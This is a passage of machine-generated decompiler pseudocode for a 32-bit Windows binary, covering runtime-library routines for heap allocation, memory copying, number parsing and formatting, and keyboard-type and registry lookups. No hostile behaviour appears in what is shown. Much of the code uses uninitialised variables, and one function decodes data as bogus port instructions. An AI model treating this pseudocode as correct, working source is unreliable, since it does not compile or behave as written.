            // 0x4022b5
            v9 = v7;
            if (v12 >= 12) {
                // 0x4022bb
                *(int32_t *)(v3 + v5) = v12 | 2;
                function_401a62();
                v9 = v3;
            }
        } else {
            // 0x402269
            g72 = v11 - v10;
            int32_t v13 = g71; // 0x402275
            int32_t v14 = v13 + v10; // 0x402275
            g71 = v14;
            v9 = v3;
            if (v14 <= 11) {
                // 0x402288
                g72 = v11;
                g71 = v13;
                v9 = v7;
            }
        }
        goto lab_0x4023d4;
      lab_0x4023d4:
        // 0x4023d4
        g58 += v9 - v7;
        int32_t v15 = *v6; // 0x4023de
        *v6 = v15 & -0x7ffffffd | v9;
        // 0x4023ed
        return v15 & -0x80000000 | 1;
    }
    uint32_t v16 = v3 - v7;
    if (v8 == g72) {
        // 0x4022ed
        if (g71 >= v16) {
            // break -> 0x4022f8
            break;
        }
        // 0x40234b
        function_401c8e();
    }
    int32_t v17 = v8; // 0x402357
    uint32_t v18; // 0x40235d
    int32_t v19; // 0x402383
    int32_t v20; // 0x40239a
    int32_t * v21; // 0x4023a1
    if ((*(char *)v8 & 2) == 0) {
        // 0x402359
        v18 = *(int32_t *)(v8 + 8);
        if (v18 >= v16) {
            // 0x40237a
            function_40199e();
            v19 = v18 - v16;
            if (v19 < 12) {
                // 0x40239a
                v20 = v19 + v3;
                v21 = (int32_t *)(v20 + v5);
                *v21 = *v21 & -2;
                v9 = v20;
                goto lab_0x4023d4;
            } else {
                // 0x40238c
                function_401c06();
                v9 = v3;
                goto lab_0x4023d4;
            }
        }
        // 0x40236c
        v17 = v18 + v8;
    }
    while (*(int32_t *)v17 <= -1 && (char)function_401d92() != 0) {
        // 0x4022dd
        if (v8 == g72) {
            // 0x4022ed
            if (g71 >= v16) {
                // break -> 0x4022f8
                break;
            }
            // 0x40234b
            function_401c8e();
        }
        // 0x402354
        v17 = v8;
        if ((*(char *)v8 & 2) == 0) {
            // 0x402359
            v18 = *(int32_t *)(v8 + 8);
            if (v18 >= v16) {
                // 0x40237a
                function_40199e();
                v19 = v18 - v16;
                if (v19 < 12) {
                    // 0x40239a
                    v20 = v19 + v3;
                    v21 = (int32_t *)(v20 + v5);
                    *v21 = *v21 & -2;
                    v9 = v20;
                    goto lab_0x4023d4;
                } else {
                    // 0x40238c
                    function_401c06();
                    v9 = v3;
                    goto lab_0x4023d4;
                }
            }
            // 0x40236c
            v17 = v18 + v8;
        }
    }
    // 0x4023ed
    return 0;
}

// Address range: 0x4023f6 - 0x4024a7
int32_t function_4023f6(int32_t a1) {
    // 0x4023f6
    if (g61 == 0) {
        // 0x40240a
        int32_t v1; // 0x4023f6
        if ((char)function_4017fa(v1) == 0) {
            int32_t result = function_4024ae(0, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x402418
            return result;
        }
    }
    int32_t v2 = __readfsdword(0); // bp-32, 0x402425
    int32_t v3 = &v2; // 0x402425
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x402432
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v5 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-36, 0x402434
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v4 = (int32_t)&v5;
    }
    // 0x40243e
    if ((char)function_40221a() == 0) {
        // 0x402450
        if (function_401ee6() != 0) {
            // 0x402472
            function_4025be();
            function_402076();
        }
    }
    // 0x402486
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x4024ae;
    int32_t result2 = 0; // 0x40249a
    if (g51 != 0) {
        // 0x40249c
        *(int32_t *)(v4 + 4) = (int32_t)&g63;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
        result2 = &g118;
    }
    // 0x4024a6
    return result2;
}

// Address range: 0x4024a7 - 0x4024ac
int32_t function_4024a7(void) {
    // 0x4024a7
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4024ac - 0x4024ae
int32_t function_4024ac(void) {
    // 0x4024ac
    int32_t result; // 0x4024ac
    return result;
}

// Address range: 0x4024ae - 0x4024b7
int32_t function_4024ae(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4024ae
    int32_t v1; // 0x4024ae
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x4024ba - 0x4024da
int32_t function_4024ba(void) {
    // 0x4024ba
    int32_t v1; // 0x4024ba
    if (v1 < 1) {
        // 0x4024d6
        return 0;
    }
    int32_t result = function_401ee6(); // 0x4024bf
    if (result != 0) {
        // 0x4024d6
        return result;
    }
    // 0x4024cb
    function_4025a2((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x4024da - 0x4024fa
int32_t function_4024da(void) {
    // 0x4024da
    int32_t v1; // 0x4024da
    if (v1 == 0 || function_402076() == 0) {
        // 0x4024f6
        return 0;
    }
    // 0x4024eb
    function_4025a2((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x4024fa - 0x402547
int32_t function_4024fa(void) {
    // 0x4024fa
    int32_t v1; // 0x4024fa
    int32_t v2; // 0x4024fa
    if (v2 == 0) {
        // 0x402532
        if (v1 == 0) {
            // 0x40252a
            return 0;
        }
        // 0x402536
        if (function_401ee6() != 0) {
            // 0x402544
            abort();
            // UNREACHABLE
        }
        // 0x40252b
        function_4025a2((int32_t)&g118);
        // UNREACHABLE
    }
    if (v1 == 0) {
        // 0x40251c
        *(int32_t *)v2 = 0;
        int32_t result = function_402076(); // 0x402520
        if (result == 0) {
            // 0x40252a
            return result;
        }
        // 0x402515
        function_4025a2((int32_t)&g118);
        // UNREACHABLE
    }
    int32_t result2 = function_4023f6(v2); // 0x402507
    if (result2 != 0) {
        // 0x402512
        *(int32_t *)v2 = result2;
        return result2;
    }
    // 0x40252b
    function_4025a2((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x40254a - 0x402555
int32_t function_40254a(void) {
    // 0x40254a
    function_40335a();
    // UNREACHABLE
}

// Address range: 0x402555 - 0x402556
int32_t function_402555(void) {
    // 0x402555
    int32_t result; // 0x402555
    return result;
}

// Address range: 0x402556 - 0x40259d
int32_t function_402556(void) {
    // 0x402556
    int32_t v1; // 0x402556
    if ((v1 & 127) == 0) {
        // 0x402576
        function_404272();
    }
    // 0x402592
    function_40254a();
    // UNREACHABLE
}

// Address range: 0x40259d - 0x4025a0
int32_t function_40259d(int32_t a1, int32_t a2) {
    // 0x40259d
    int32_t result; // 0x40259d
    return result;
}

// Address range: 0x4025a2 - 0x4025ad
int32_t function_4025a2(int32_t a1) {
    // 0x4025a2
    return function_402556();
}

// Address range: 0x4025ad - 0x4025ae
int32_t function_4025ad(void) {
    // 0x4025ad
    int32_t result; // 0x4025ad
    return result;
}

// Address range: 0x4025ae - 0x4025be
int32_t function_4025ae(int32_t a1, int32_t a2) {
    // 0x4025ae
    return function_404272();
}

// Address range: 0x4025be - 0x4025fe
int32_t function_4025be(void) {
    // 0x4025be
    uint32_t v1; // 0x4025be
    uint32_t result; // 0x4025be
    uint32_t v2; // 0x4025be
    if (v1 > v2) {
        if (result >= 0) {
            int32_t v3 = result - 4; // 0x4025dd
            int32_t v4 = v3 + v1; // 0x4025e1
            int32_t v5 = result / 4; // 0x4025e5
            __asm_rep_movsd_memcpy((char *)v4, (char *)(v3 + v2), v5);
            char * v6 = (char *)((-4 * v5 | 3) + v4); // 0x4025f8
            __asm_rep_movsb_memcpy(v6, v6, result & 3);
        }
        // 0x4025fb
        return result;
    }
    if (v1 == v2) {
        // 0x4025fb
        return result;
    }
    if (result < 0) {
        // 0x4025fb
        return result;
    }
    int32_t v7 = (int32_t)result / 4; // 0x4025cc
    __asm_rep_movsd_memcpy((char *)v1, (char *)v2, v7);
    bool v8; // 0x4025be
    char * v9 = (char *)((v8 ? -4 : 4) * v7 + v1); // 0x4025d8
    __asm_rep_movsb_memcpy(v9, v9, result & 3);
    return result;
}

// Address range: 0x4025fe - 0x402623
int32_t function_4025fe(void) {
    // 0x4025fe
    int32_t lpPerformanceCount; // bp-8, 0x4025fe
    if (!QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount)) {
        int32_t result = GetTickCount(); // 0x402616
        g10 = result;
        return result;
    }
    int32_t result2 = &lpPerformanceCount; // 0x40260b
    g10 = result2;
    return result2;
}

// Address range: 0x402626 - 0x402635
int32_t function_402626(void) {
    // 0x402626
    int32_t v1; // 0x402626
    *(int16_t *)&g14 = (int16_t)v1;
    return __asm_fnclex();
}

// Address range: 0x402636 - 0x40263d
int32_t function_402636(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x402636
    return 0;
}

// Address range: 0x40263e - 0x402694
int32_t function_40263e(void) {
    // 0x40263e
    int32_t v1; // 0x40263e
    int16_t v2 = *(int16_t *)(v1 + 4); // 0x402644
    int32_t result; // 0x40263e
    int32_t v3; // 0x40263e
    int32_t v4; // 0x40263e
    if (v2 < 0xd7b4) {
        int32_t v5 = (v2 & -0x284e) != -0x284e ? 0 : v1;
        int32_t v6 = v5 != 0 ? v5 : v1;
        result = 0;
        if (v6 != 0) {
            // 0x402674
            function_4025ae(v4, v3);
            result = v6;
        }
    } else {
        // 0x40267d
        result = 0;
        if (v1 != (int32_t)&g53) {
            // 0x402685
            function_4025ae(v4, v3);
            result = 0;
        }
    }
    // 0x40268f
    return result;
}

// Address range: 0x402696 - 0x4026b1
int32_t function_402696(void) {
    // 0x402696
    int32_t v1; // 0x402696
    unsigned char v2 = (char)v1;
    int32_t v3; // 0x402696
    unsigned char v4 = (char)v3;
    int32_t v5; // 0x402696
    *(char *)v5 = v2 < v4 ? v2 : v4;
    return function_4025be();
}

// Address range: 0x4026b2 - 0x402721
int32_t function_4026b2(void) {
    // 0x4026b2
    uint32_t v1; // 0x4026b2
    int32_t v2 = (uint32_t)(v1 / 4); // 0x4026ba
    int32_t result; // 0x4026b2
    int32_t v3; // 0x4026b2
    if (v1 < 4) {
        goto lab_0x4026e2;
      lab_0x4026e2:;
        int32_t v4 = v1 & 3; // 0x4026e3
        if (v4 == 0 || *(char *)result != *(char *)v3) {
            // 0x402704
            return result;
        }
        int32_t v5 = v4 - 1; // 0x4026ee
        if (v5 == 0) {
            // 0x402704
            return 0;
        }
        // 0x4026f1
        if (*(char *)(result + 1) != *(char *)(v3 + 1)) {
            // 0x402704
            return result;
        }
        // 0x4026f9
        if (v5 == 1 || *(char *)(result + 2) == *(char *)(v3 + 2)) {
            // 0x402704
            return 0;
        }
        // 0x402704
        return result;
    }
    int32_t v6; // 0x4026b2
    int32_t v7 = v6;
    int32_t v8; // 0x4026b2
    int32_t result2 = v8;
    while (*(int32_t *)result2 == *(int32_t *)v7) {
        int32_t v9 = result2 + 4;
        if (v2 == 1) {
            // 0x4026dc
            result = v9;
            v3 = v7 + 4;
            goto lab_0x4026e2;
        }
        // 0x4026c7
        if (*(int32_t *)v9 != *(int32_t *)(v7 + 4)) {
            // break -> 0x40271e
            break;
        }
        int32_t v10 = result2 + 8; // 0x4026d1
        int32_t v11 = v7 + 8; // 0x4026d4
        v2 -= 2;
        result = v10;
        v3 = v11;
        if (v2 == 0) {
            goto lab_0x4026e2;
        }
        v7 = v11;
        result2 = v10;
    }
    // 0x402704
    return result2;
}

// Address range: 0x402722 - 0x402741
int32_t function_402722(void) {
    // 0x402722
    int32_t v1; // 0x402722
    int32_t v2 = 256 * v1 & 0xff00 | v1 & -0xff01; // 0x402725
    int32_t result = 0x10000 * v2 | v2 & 0xffff; // 0x40272c
    uint32_t v3; // 0x402722
    if (v3 >= 0) {
        int32_t v4 = v3 / 4; // 0x402731
        int32_t v5; // 0x402722
        __asm_rep_stosd_memset((char *)v5, result, v4);
        bool v6; // 0x402722
        int32_t v7 = v6 ? -4 : 4; // 0x402736
        __asm_rep_stosb_memset((char *)(v7 * v4 + v5), (char)v1, v3 & 3);
    }
    // 0x40273f
    return result;
}

// Address range: 0x402742 - 0x4027a1
int32_t function_402742(void) {
    // 0x402742
    int32_t v1; // bp-36, 0x402742
    int32_t v2 = &v1; // 0x402746
    int32_t v3 = 0;
    int32_t v4; // 0x402742
    uint32_t v5 = v4 < 0 ? -v4 : v4;
    int32_t v6 = v5 / 10; // 0x40275b
    *(char *)(v3 + v2) = (char)(v5 % 10) | 48;
    int32_t v7 = v3 + 1; // 0x402763
    while (v5 >= 10) {
        // 0x402759
        v3 = v7;
        v5 = v6;
        v6 = v5 / 10;
        *(char *)(v3 + v2) = (char)(v5 % 10) | 48;
        v7 = v3 + 1;
    }
    int32_t v8 = v7; // 0x40276a
    if (v4 < 0) {
        // 0x40276c
        *(char *)(v7 + v2) = 45;
        v8 = v3 + 2;
    }
    char v9 = v8; // 0x402771
    int32_t v10; // 0x402742
    char * v11 = (char *)v10; // 0x402771
    *v11 = v9;
    int32_t v12 = v10 + 1; // 0x402773
    int32_t v13; // 0x402742
    int32_t v14 = v13 < 255 ? v13 : 255;
    int32_t v15 = v6; // 0x402787
    int32_t v16 = v12; // 0x402787
    if (v14 > v8) {
        int32_t v17 = v14 - v8; // 0x402785
        *v11 = (char)v17 + v9;
        __asm_rep_stosb_memset((char *)v12, 32, v17);
        v15 = v6 & 0x1fffff00 | 32;
        bool v18; // 0x402742
        v16 = v17 * (v18 ? -1 : 1) + v12;
    }
    int32_t result = v15; // 0x402790
    int32_t v19 = v8;
    int32_t v20 = v16; // 0x402742
    v19--;
    unsigned char v21 = *(char *)(v19 + v2); // 0x402790
    result = result & -256 | (int32_t)v21;
    *(char *)v20 = v21;
    v20++;
    while (v19 != 0) {
        // 0x402790
        v19--;
        v21 = *(char *)(v19 + v2);
        result = result & -256 | (int32_t)v21;
        *(char *)v20 = v21;
        v20++;
    }
    // 0x40279a
    return result;
}

// Address range: 0x4027a2 - 0x4027ac
int32_t function_4027a2(int32_t a1, int32_t a2) {
    // 0x4027a2
    return function_402742();
}

// Address range: 0x4027ae - 0x40287f
int32_t function_4027ae(void) {
    // 0x4027ae
    int32_t v1; // 0x4027ae
    int32_t v2; // 0x4027ae
    int32_t v3; // 0x4027ae
    int32_t v4; // 0x4027ae
    int32_t v5; // 0x4027ae
    int32_t v6; // 0x4027ae
    int32_t v7; // 0x4027c1
    int32_t v8; // 0x4027c3
    if (v6 == 0) {
        goto lab_0x40282d;
    } else {
        while (true) {
          lab_0x4027c1:;
            // 0x4027c1
            int32_t v9; // 0x4027ae
            v4 = v9;
            unsigned char v10 = *(char *)v4; // 0x4027c1
            int32_t v11; // 0x4027ae
            v7 = v11 & -256;
            int32_t v12 = v7 | (int32_t)v10; // 0x4027c1
            v8 = v4 + 1;
            v11 = v12;
            v9 = v8;
            v2 = 0;
            v1 = v12;
            v5 = v8;
            v3 = 256;
            switch (v10) {
                case 32: {
                    goto lab_0x4027c1;
                }
                case 45: {
                    goto lab_0x402834;
                }
                case 43: {
                    // 0x402834
                    v3 = 0;
                    goto lab_0x402834;
                }
                default: {
                    goto lab_0x4027d5;
                }
            }
        }
    }
  lab_0x40281a:;
    // 0x40281a
    int32_t v13; // 0x4027ae
    int32_t result2; // 0x4027ae
    int32_t v14; // 0x4027ae
    if ((v2 & 0xff00) == 256) {
        int32_t result = -v13; // 0x402827
        if (v13 == 0 || result < 0) {
            // 0x402879
            *(int32_t *)v14 = 0;
            return result;
        }
    } else {
        // 0x40281e
        result2 = v13;
        if (v13 >= 0) {
          lab_0x402879:
            // 0x402879
            *(int32_t *)v14 = 0;
            return result2;
        }
    }
    goto lab_0x40282d;
  lab_0x402834:
    // 0x402834
    v2 = v3;
    v1 = v7 | (int32_t)*(char *)v8;
    v5 = v4 + 2;
    goto lab_0x4027d5;
  lab_0x4027d5:;
    char v38 = v1; // 0x4027d5
    int32_t v19 = v1; // 0x4027ae
    int32_t v16 = v5; // 0x4027ae
    int32_t v32; // 0x4027ae
    int32_t v30; // 0x4027ae
    switch (v38) {
        case 36: {
            goto lab_0x402839;
        }
        case 120: {
            goto lab_0x402839;
        }
        case 88: {
            goto lab_0x402839;
        }
        default: {
            if (v38 != 48) {
                // 0x4027fc
                v32 = v1;
                v30 = v5;
                if (v38 == 0) {
                    goto lab_0x40282d;
                } else {
                    goto lab_0x402800;
                }
            } else {
                unsigned char v39 = *(char *)v5; // 0x4027e9
                int32_t v40 = v1 & -256 | (int32_t)v39; // 0x4027e9
                int32_t v41 = v5 + 1; // 0x4027eb
                v32 = v40;
                v30 = v41;
                v13 = 0;
                v19 = v40;
                v16 = v41;
                switch (v39) {
                    case 120: {
                        goto lab_0x402839;
                    }
                    case 88: {
                        goto lab_0x402839;
                    }
                    case 0: {
                        goto lab_0x40281a;
                    }
                    default: {
                        goto lab_0x402800;
                    }
                }
            }
        }
    }
  lab_0x402824:
    // 0x402824
    goto lab_0x40282d;
  lab_0x40282d:
    // 0x402879
    *(int32_t *)v14 = 1 - v6;
    return 0;
  lab_0x402839:;
    unsigned char v15 = *(char *)v16; // 0x40283e
    if (v15 == 0) {
        goto lab_0x402824;
    } else {
        int32_t v17 = v16 + 1;
        int32_t v18 = v19 & -256 | (int32_t)v15;
        int32_t v20 = 0;
        int32_t v21 = v18; // 0x402848
        if ((char)v18 >= 97) {
            // 0x40284a
            v21 = v18 + 224 & 255 | v18 & -256;
        }
        int32_t v22 = v21;
        int32_t v23 = v22 + 208; // 0x40284d
        unsigned char v24 = (char)v23; // 0x402850
        int32_t v25 = v23; // 0x402853
        if (v24 >= 10) {
            // 0x402855
            if (v24 >= 23) {
                // break -> 0x40282d
                break;
            }
            // 0x40285d
            v25 = v22 + 201;
        }
        // 0x402860
        while (v20 <= 0xfffffff) {
            int32_t v26 = v22 & -256; // 0x40284d
            int32_t v27 = (v25 & 255 | v26) + 16 * v20; // 0x402867
            unsigned char v28 = *(char *)v17; // 0x402869
            if (v28 == 0) {
                // 0x402870
                result2 = (v2 & 0xff00) != 256 ? v27 : -v27;
                goto lab_0x402879;
            }
            v17++;
            v18 = v26 | (int32_t)v28;
            v20 = v27;
            v21 = v18;
            if ((char)v18 >= 97) {
                // 0x40284a
                v21 = v18 + 224 & 255 | v18 & -256;
            }
            // 0x40284d
            v22 = v21;
            v23 = v22 + 208;
            v24 = (char)v23;
            v25 = v23;
            if (v24 >= 10) {
                // 0x402855
                if (v24 >= 23) {
                    // break -> 0x40282d
                    break;
                }
                // 0x40285d
                v25 = v22 + 201;
            }
        }
        goto lab_0x40282d;
    }
  lab_0x402800:;
    int32_t v29 = v30;
    int32_t v31 = v32;
    int32_t v33 = 0;
    int32_t v34 = v31 + 208; // 0x402800
    while (v33 <= 0xccccccc && (char)v34 <= 9) {
        int32_t v35 = v31 & -256; // 0x402800
        int32_t v36 = (v34 & 255 | v35) + 10 * v33; // 0x402811
        unsigned char v37 = *(char *)v29; // 0x402813
        v13 = v36;
        if (v37 == 0) {
            goto lab_0x40281a;
        }
        v29++;
        v31 = v35 | (int32_t)v37;
        v33 = v36;
        v34 = v31 + 208;
    }
    goto lab_0x40282d;
}

// Address range: 0x402882 - 0x40288d
int32_t function_402882(void) {
    // 0x402882
    return function_40288e();
}

// Address range: 0x40288e - 0x4028b1
int32_t function_40288e(void) {
    // 0x40288e
    uint32_t v1; // 0x40288e
    int32_t v2 = v1 < 255 ? v1 : 255; // 0x4028a7
    int32_t v3; // 0x40288e
    char v4 = *(char *)v3; // 0x40289d
    int32_t v5; // 0x40288e
    int32_t v6 = v5; // 0x4028a2
    while (v4 != 0) {
        int32_t v7 = v5 + 1; // 0x4028a4
        *(char *)v7 = v4;
        v2--;
        v5 = v7;
        v3++;
        v6 = v7;
        if (v2 == 0) {
            // break -> 0x4028aa
            break;
        }
        v4 = *(char *)v3;
        v6 = v5;
    }
    // 0x4028aa
    int32_t v8; // 0x40288e
    int32_t result = v6 - v8; // 0x4028ab
    *(char *)v8 = (char)result;
    return result;
}

// Address range: 0x4028b2 - 0x4028b8
int32_t function_4028b2(int32_t nTypeFlag) {
    // 0x4028b2
    return GetKeyboardType(nTypeFlag);
}

// Address range: 0x4028ba - 0x4028e9
int32_t function_4028ba(void) {
    // 0x4028ba
    int32_t nTypeFlag; // 0x4028ba
    if (GetKeyboardType(nTypeFlag) != 7) {
        // 0x4028e5
        return 0;
    }
    int32_t v1 = GetKeyboardType(1) & 0xff00; // 0x4028d0
    return v1 == 1024 | v1 == 3328;
}

// Address range: 0x4028ea - 0x402981
int32_t function_4028ea(void) {
    uint16_t lpSubKey = *(int16_t *)&g14; // 0x4028f0
    int32_t ulOptions; // bp-8, 0x4028ea
    int32_t hKey; // 0x4028ea
    int32_t v1 = RegOpenKeyExA((int32_t *)hKey, (char *)(int32_t)lpSubKey, (int32_t)&ulOptions, 1, NULL); // 0x40290c
    if (v1 != 0) {
        uint16_t v2 = *(int16_t *)&g14 & -64 | lpSubKey & 63; // 0x402974
        *(int16_t *)&g14 = v2;
        return v1 & -0x10000 | (int32_t)v2;
    }
    int32_t v3 = __readfsdword(0); // bp-48, 0x40291d
    __writefsdword(0, (int32_t)&v3);
    RegQueryValueExA((int32_t *)4, (char *)&g118, &g118, &g118, (char *)&g118, &g118);
    __writefsdword(0, ulOptions);
    return RegCloseKey((int32_t *)ulOptions);
}

// Address range: 0x402981 - 0x402a64
int32_t function_402981(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18) {
    int32_t v1 = a1;
    int32_t v2 = a6;
    int32_t v3; // 0x402981
    char * v4 = (char *)(v3 + 79); // 0x402981
    unsigned char v5 = *v4; // 0x402981
    int32_t v6; // 0x402981
    unsigned char v7 = v5 + (char)v6; // 0x402981
    *v4 = v7;
    int32_t v8; // 0x402981
    __asm_outsd((int16_t)v6 + 1, *(int32_t *)(v8 + 1));
    if (v7 < v5) {
        // 0x4029fb
        return function_402b42();
    }
    int16_t v9 = a16; // 0x402990
    __asm_outsb(v9, (char)a18);
    int32_t v10; // 0x402981
    *(char *)v10 = __asm_insb(v9);
    int64_t v11 = (int64_t)*(int32_t *)(a16 + 84 + 2 * a16); // 0x402998
    int32_t v12 = a7; // 0x4029a3
    int32_t result = a9; // 0x4029a3
    int32_t * v13 = &v2; // 0x4029a3
    int32_t v14 = a18; // 0x4029a3
    if (0x5046004c * v11 != 0x5046004c00000000 * v11 / 0x100000000) {
        // 0x4029a5
        v12 = v1;
        *(char *)a12 = __asm_insb((int16_t)a3);
        if (a18 == 1) {
            char * v15 = (char *)v12; // 0x4029aa
            *v15 = *v15 + 2 * (char)v12;
            return __asm_wait();
        }
        // 0x402a0f
        v1 = v2;
        result = a3;
        v13 = &v1;
        v14 = a12;
    }
    int32_t v16 = (int32_t)v13;
    int32_t v17 = v16 - 4; // 0x402a10
    *(int32_t *)v17 = v14;
    *(int32_t *)result = v12;
    bool v18; // 0x402981
    int32_t v19 = v18 ? -4 : 4; // 0x402a15
    int32_t v20 = result + v19; // 0x402a15
    uint32_t v21 = *(int32_t *)(v12 - 40); // 0x402a16
    int32_t * v22 = (int32_t *)(v16 - 8); // 0x402a1b
    *v22 = v21;
    int32_t v23 = v21 / 4 - 1; // 0x402a1f
    __asm_rep_stosd_memset((char *)v20, 0, v23);
    __asm_rep_stosb_memset((char *)(v23 * v19 + v20), 0, *v22 & 3);
    int32_t v24 = *(int32_t *)(v12 - 72); // 0x402a2c
    int32_t v25 = v17; // 0x402a31
    if (v24 != 0) {
        // 0x402a33
        v25 = v17 - 4;
        *(int32_t *)v25 = v24;
    }
    int32_t v26 = v25;
    int32_t v27 = *(int32_t *)(v12 - 36); // 0x402a34
    while (v27 != 0) {
        int32_t v28 = *(int32_t *)v27; // 0x402a3b
        int32_t v29 = v26;
        v24 = *(int32_t *)(v28 - 72);
        v25 = v29;
        if (v24 != 0) {
            // 0x402a33
            v25 = v29 - 4;
            *(int32_t *)v25 = v24;
        }
        // 0x402a34
        v26 = v25;
        v27 = *(int32_t *)(v28 - 36);
    }
    // 0x402a3f
    if (v26 == v17) {
        // 0x402a60
        return result;
    }
    int32_t v30 = v26; // 0x402a41
    int32_t v31 = *(int32_t *)v30; // 0x402a43
    int32_t v32 = *(int32_t *)v31; // 0x402a46
    int32_t v33 = v31 + 4;
    int32_t v34 = *(int32_t *)(v33 + 16); // 0x402a49
    if (v34 != 0) {
        // 0x402a50
        *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
    }
    // 0x402a56
    v32--;
    int32_t v35 = v33 + 28; // 0x402a5a
    while (v32 != 0) {
        // 0x402a49
        v33 = v35;
        v34 = *(int32_t *)(v33 + 16);
        if (v34 != 0) {
            // 0x402a50
            *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
        }
        // 0x402a56
        v32--;
        v35 = v33 + 28;
    }
    // 0x402a5c
    v30 += 4;
    while (v30 != v17) {
        // 0x402a43
        v31 = *(int32_t *)v30;
        v32 = *(int32_t *)v31;
        v33 = v31 + 4;
        v34 = *(int32_t *)(v33 + 16);
        if (v34 != 0) {
            // 0x402a50
            *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
        }
        // 0x402a56
        v32--;
        v35 = v33 + 28;
        while (v32 != 0) {
            // 0x402a49
            v33 = v35;
            v34 = *(int32_t *)(v33 + 16);
            if (v34 != 0) {
                // 0x402a50
                *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
            }
            // 0x402a56
            v32--;
            v35 = v33 + 28;
        }
        // 0x402a5c
        v30 += 4;
    }
    // 0x402a60
    return result;
}

// Address range: 0x402a66 - 0x402a86
int32_t function_402a66(int32_t a1) {
    int32_t v1; // 0x402a66
    int32_t v2 = *(int32_t *)v1; // 0x402a6c
    int32_t v3 = *(int32_t *)(v2 - 36); // 0x402a71
    if (*(int32_t *)(v2 - 64) != 0) {
        // 0x402a78
        function_403922();
    }
    // 0x402a66
    while (v3 != 0) {
        // 0x402a6c
        v2 = *(int32_t *)v3;
        v3 = *(int32_t *)(v2 - 36);
        if (*(int32_t *)(v2 - 64) != 0) {
            // 0x402a78
            function_403922();
        }
    }
    // 0x402a83
    int32_t result; // 0x402a66
    return result;
}

// Address range: 0x402a86 - 0x402ab4
int32_t function_402a86(int32_t a1, int32_t a2) {
    int32_t v1; // 0x402a86
    int32_t v2 = *(int32_t *)(v1 - 48); // 0x402a8c
    int32_t v3; // 0x402a86
    int32_t v4; // 0x402a86
    int32_t v5; // bp-4, 0x402a86
    int32_t result; // 0x402a86
    int32_t v6; // 0x402a97
    int32_t v7; // 0x402a9a
    bool v8; // 0x402a86
    uint16_t v9; // 0x402a93
    int32_t v10; // 0x402a93
    if (v2 != 0) {
        // 0x402a93
        v9 = *(int16_t *)v2;
        v10 = v9;
        *(int32_t *)((int32_t)&v5 - 4) = v10;
        v6 = v2 + 2;
        v4 = v6;
        v3 = v10;
        if (v9 == 0) {
            // ._crit_edge
            if (v6 == 0) {
                // 0x402aa9
                return 2 * v10;
            }
        } else {
            v7 = v3 - 1;
            while (*(int16_t *)v4 != (int16_t)result) {
                // .lr.ph
                v4 += (v8 ? -2 : 2);
                if (v7 == 0) {
                    // break -> 0x402aa0
                    break;
                }
                v7--;
            }
            // 0x402aa9
            return 2 * v10 - v7;
        }
    }
    int32_t v11 = *(int32_t *)(v1 - 36); // 0x402aa0
    // 0x402a86
    while (v11 != 0) {
        // 0x402a8a
        v1 = *(int32_t *)v11;
        v2 = *(int32_t *)(v1 - 48);
        if (v2 != 0) {
            // 0x402a93
            v9 = *(int16_t *)v2;
            v10 = v9;
            *(int32_t *)((int32_t)&v5 - 4) = v10;
            v6 = v2 + 2;
            v4 = v6;
            v3 = v10;
            if (v9 == 0) {
                // ._crit_edge
                if (v6 == 0) {
                    // 0x402aa9
                    return 2 * v10;
                }
            } else {
                v7 = v3 - 1;
                while (*(int16_t *)v4 != (int16_t)result) {
                    // .lr.ph
                    v4 += (v8 ? -2 : 2);
                    if (v7 == 0) {
                        // break -> 0x402aa0
                        break;
                    }
                    v7--;
                }
                // 0x402aa9
                return 2 * v10 - v7;
            }
        }
        // 0x402aa0
        v11 = *(int32_t *)(v1 - 36);
    }
    // 0x402aa7
    return result;
}

// Address range: 0x402ab6 - 0x402abc
int32_t function_402ab6(void) {
    // 0x402ab6
    return -0x7fff0001;
}

// Address range: 0x402abe - 0x402abf
int32_t function_402abe(void) {
    // 0x402abe
    int32_t result; // 0x402abe
    return result;
}

// Address range: 0x402ac2 - 0x402ac3
int32_t function_402ac2(void) {
    // 0x402ac2
    int32_t result; // 0x402ac2
    return result;
}

// Address range: 0x402ac6 - 0x402ac7
int32_t function_402ac6(void) {
    // 0x402ac6
    int32_t result; // 0x402ac6
    return result;
}

// Address range: 0x402aca - 0x402af0
int32_t function_402aca(void) {
    // 0x402aca
    int32_t v1; // 0x402aca
    uint16_t v2 = (int16_t)v1;
    int32_t result; // 0x402aca
    if (v2 != 0 && v2 < 0xc000) {
        // 0x402ada
        int32_t v3; // 0x402aca
        function_402a86(v3, result);
    }
    // 0x402ae5
    return result;
}

// Address range: 0x402af0 - 0x402af1
int32_t function_402af0(void) {
    // 0x402af0
    int32_t result; // 0x402af0
    return result;
}

// Address range: 0x402af2 - 0x402b1b
int32_t function_402af2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = __readfsdword(0); // 0x402b05
    __writefsdword(0, (int32_t)&v1);
    int32_t result; // 0x402af2
    return result;
}

// Address range: 0x402b1b - 0x402b20
int32_t function_402b1b(void) {
    int32_t result = function_402c5a((int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x402b1b
    return result;
}

// Address range: 0x402b20 - 0x402b3f
int32_t function_402b20(int32_t a1) {
